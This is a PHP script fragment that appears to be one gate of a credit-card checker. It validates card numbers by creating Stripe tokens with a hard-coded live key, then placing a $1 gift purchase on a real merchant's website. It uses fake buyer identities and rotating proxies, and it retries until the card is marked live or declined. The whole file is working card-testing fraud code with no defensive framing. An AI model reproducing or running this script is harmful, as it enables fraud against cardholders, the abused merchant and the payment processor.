<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78ef418&time_on_page='.rand(50000, 100000).'&key=pk_live_CQCJt113nBqBl1xwzAFQwjhG';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://www.digitaladventures.com/purchase-gift', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$authenticity_token = trim(strip_tags($this->getstr($r2->body, 'authenticity_token" value="', '"')));

if (empty($authenticity_token)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'utf8=%E2%9C%93&authenticity_token='.urlencode($authenticity_token).'&gift%5Bproduct%5D=Custom+Amount&gift%5Bamount%5D=1&gift%5Bgifter_first_name%5D='.$fake->first.'&gift%5Bgifter_last_name%5D='.$fake->last.'&gift%5Bgifter_email%5D='.urlencode($fake->email).'&gift%5Bgifter_phone%5D=2564567654&gift%5Bgiftee_first_name%5D='.$fake->first.'&gift%5Bgiftee_last_name%5D='.$fake->last.'&gift%5Bgiftee_email%5D=&gift%5Bphysical%5D=&gift%5Bgiftee_address_1%5D=&gift%5Bgiftee_address_2%5D=&gift%5Bgiftee_zip%5D=&gift%5Bgiftee_message%5D=&gift%5Bnote%5D=&stripeToken='.$tok.'';

$r3 = $this->curlx->Post('https://www.digitaladventures.com/gifts', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$err = trim(strip_tags($this->getstr($r3->body, '<div class="alert alert-danger alert-dismissible" role="alert">', '<')));

$err = trim(str_replace(', please check your card details and try again', '', $err));

$status = $this->response->Stripe($r3->body, $err);

end: